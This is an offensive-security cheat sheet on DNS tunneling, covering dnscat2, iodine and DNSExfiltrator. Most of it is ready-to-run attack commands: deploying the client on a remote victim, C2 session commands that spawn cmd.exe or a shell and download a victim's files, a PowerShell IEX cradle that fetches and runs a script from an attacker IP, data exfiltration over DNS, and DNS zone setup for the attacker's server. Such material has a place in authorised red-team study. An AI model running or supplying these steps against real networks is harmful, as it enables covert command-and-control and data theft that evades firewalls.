---
tags:
  - DNS
  - Defense_Evasion
  - Exfiltration
  - Foundational
  - Network
---

## DNS Tunneling
resources: [dnscat2 GitHub](https://github.com/iagox86/dnscat2)

> [!tip] Encode data in DNS queries and responses. Bypass firewalls that allow DNS but block other traffic.

### Theory

#### How DNS Tunneling Works
> [!info] Tunneling flow:
> 1. Client encodes data in DNS query (subdomain or TXT record)
> 2. Query sent to attacker-controlled DNS server
> 3. Server decodes query, processes, encodes response
> 4. Response returned via DNS protocol
> 5. Data exfiltration/C2 over DNS

#### DNS Record Types for Tunneling
> - **TXT** - Up to 255 bytes per record, commonly used
> - **A** - 4 bytes encoded as IP address
> - **AAAA** - 16 bytes encoded as IPv6 address
> - **CNAME** - Variable length subdomain encoding
> - **MX** - Mail exchange records

#### DNS Tunneling Limitations
> [!warning] Limitations:
> - Slow compared to direct connections
> - Query size limits
> - May trigger anomaly detection (many DNS queries)
> - Requires authoritative DNS server

### DNS Tunneling with dnscat2

#### Server Setup [Local]
```bash
# Install dnscat2 server
git clone https://github.com/iagox86/dnscat2
cd dnscat2/server
gem install bundler
bundle install
```

#### Start Server with Domain
```bash
ruby dnscat2.rb <YourDomain> --secret=<Secret>
```

#### Start Server Direct Mode [alternative]
```bash
ruby dnscat2.rb --dns server=0.0.0.0,port=53 --secret=<Secret>
```

#### Client Deployment [Remote]
```cmd
dnscat2.exe --dns server=<DNSServer>,domain=<YourDomain> --secret=<Secret>
```

```bash
./dnscat --dns server=<DNSServer>,domain=<YourDomain> --secret=<Secret>
```

#### dnscat2 Server Commands
```text
# List sessions
sessions

# Interact with session
session -i <ID>

# Execute command
exec cmd.exe

# Download file
download C:\Users\victim\file.txt

# Upload file
upload localfile.txt C:\Windows\Temp\file.txt

# Shell
shell
```

#### PowerShell dnscat2 Client [Remote]
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/dnscat2.ps1')
Start-Dnscat2 -Domain <YourDomain> -DNSServer <DNSServer>
```

### Alternative DNS Tunneling Tools

#### Iodine [alternative]
```bash
# Server
iodined -f -c -P <Password> 10.0.0.1 <YourDomain>

# Client
iodine -f -P <Password> <YourDomain>
```

#### DNSExfiltrator [alternative]
```bash
# Server
python dnsexfiltrator.py -d <YourDomain> -p <Password>

# Client (PowerShell)
Invoke-DNSExfiltrator -Domain <YourDomain> -Password <Password> -Data "secret data"
```

### DNS Configuration

#### Configure DNS Zone [Local]
> [!important] Point NS record for subdomain to your server.

```text
; Add to DNS zone file
tunnel    IN    NS    ns1.yourdomain.com.
ns1       IN    A     <YourServerIP>
```

#### Test DNS Resolution [Local]
```bash
dig @<YourServer> test.<YourDomain>
nslookup test.<YourDomain> <YourServer>
```
